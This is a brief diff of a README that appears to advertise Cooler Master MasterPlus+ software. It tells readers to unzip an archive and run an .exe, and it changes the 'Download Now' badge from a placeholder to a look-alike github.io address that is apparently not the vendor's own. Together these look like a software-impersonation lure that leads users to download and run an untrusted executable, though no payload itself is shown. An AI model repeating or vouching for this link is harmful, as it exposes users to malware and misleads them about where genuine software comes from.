@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install Cooler Master MasterPlus+ and automatically detect supported devices.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://cooler-master-master-plus.github.io/.github/)
 
 ## 📸 Overview
 ![coolermaster-masterplus-cooling](https://github.com/user-attachments/assets/3dc00f4a-f9cb-47a6-a6b8-7cede3e92942)
